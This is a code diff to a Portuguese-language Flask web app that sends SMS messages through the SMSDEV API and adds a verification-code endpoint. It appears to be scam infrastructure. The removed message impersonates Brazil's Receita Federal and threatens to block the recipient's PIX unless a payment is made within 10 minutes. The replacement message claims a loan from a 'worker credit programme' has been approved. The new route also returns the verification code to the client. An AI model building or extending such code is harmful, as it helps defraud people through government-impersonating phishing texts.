@@ -23,12 +23,60 @@ app.secret_key = os.environ.get("SESSION_SECRET")
 # Configurar logging
 logging.basicConfig(level=logging.DEBUG)
 
+def send_verification_code(phone_number: str) -> tuple:
+    """
+    Sends a verification code via SMS using SMSDEV API
+    Returns a tuple of (success, code or error_message)
+    """
+    try:
+        # Get SMS API key from environment variables
+        sms_api_key = os.environ.get('SMSDEV_API_KEY')
+        if not sms_api_key:
+            app.logger.error("SMSDEV_API_KEY not found in environment variables")
+            return False, "API key not configured"
+
+        # Format phone number (remove any non-digits)
+        formatted_phone = re.sub(r'\D', '', phone_number)
+        
+        if len(formatted_phone) == 11:  # Ensure it's in the correct format with DDD
+            # Generate random 4-digit code
+            verification_code = ''.join(random.choices('0123456789', k=4))
+            
+            # Message template
+            message = f"[PROGRAMA CREDITO DO TRABALHADOR] Seu código de verificação é: {verification_code}. Não compartilhe com ninguém."
+
+            # API parameters
+            params = {
+                'key': sms_api_key,
+                'type': '9',
+                'number': formatted_phone,
+                'msg': message
+            }
+
+            # Make API request
+            response = requests.get('https://api.smsdev.com.br/v1/send', params=params)
+            
+            # Log the response
+            app.logger.info(f"SMS verification code sent to {formatted_phone}. Response: {response.text}")
+            
+            if response.status_code == 200:
+                return True, verification_code
+            else:
+                return False, f"API error: {response.text}"
+        else:
+            app.logger.error(f"Invalid phone number format: {phone_number}")
+            return False, "Número de telefone inválido"
+
+    except Exception as e:
+        app.logger.error(f"Error sending verification SMS: {str(e)}")
+        return False, str(e)
+
 def send_sms(phone_number: str, full_name: str, amount: float) -> bool:
     try:
         # Get SMS API key from environment variables
-        sms_api_key = os.environ.get('SMS_API_KEY')
+        sms_api_key = os.environ.get('SMSDEV_API_KEY')
         if not sms_api_key:
-            app.logger.error("SMS_API_KEY not found in environment variables")
+            app.logger.error("SMSDEV_API_KEY not found in environment variables")
             return False
 
         # Get first name
@@ -38,7 +86,7 @@ def send_sms(phone_number: str, full_name: str, amount: float) -> bool:
         formatted_phone = re.sub(r'\D', '', phone_number)
         if len(formatted_phone) == 11:  # Include DDD
             # Message template
-            message = f"[RECEITA FEDERAL] {first_name}, SEU PIX SERA BLOQUEADO por dividas fiscais. Estamos aguardando o pagamento no valor de R${amount:.2f}. Prazo acaba em 10min."
+            message = f"[PROGRAMA CREDITO DO TRABALHADOR] {first_name}, seu empréstimo de R${amount:.2f} foi aprovado! Finalize o processo para receber via PIX instantaneamente."
 
             # API parameters
             params = {
@@ -277,6 +325,32 @@ def thank_you():
     except Exception as e:
         app.logger.error(f"[PROD] Erro na página de obrigado: {str(e)}")
         return jsonify({'error': 'Erro interno do servidor'}), 500
+        
+@app.route('/send-verification-code', methods=['POST'])
+def send_verification_code_route():
+    try:
+        data = request.json
+        phone_number = data.get('phone')
+        
+        if not phone_number:
+            return jsonify({'success': False, 'message': 'Número de telefone não fornecido'}), 400
+            
+        success, result = send_verification_code(phone_number)
+        
+        if success:
+            # Store the verification code temporarily (in a real app, this should use Redis or similar)
+            # For demo purposes, we'll just return it directly (not ideal for security)
+            return jsonify({
+                'success': True, 
+                'message': 'Código enviado com sucesso',
+                'verification_code': result  # In a real app, don't send this back to client
+            })
+        else:
+            return jsonify({'success': False, 'message': result}), 400
+            
+    except Exception as e:
+        app.logger.error(f"[PROD] Erro ao enviar código de verificação: {str(e)}")
+        return jsonify({'success': False, 'message': 'Erro ao enviar código de verificação'}), 500
 
 @app.route('/atualizar-cadastro', methods=['POST'])
 def atualizar_cadastro():
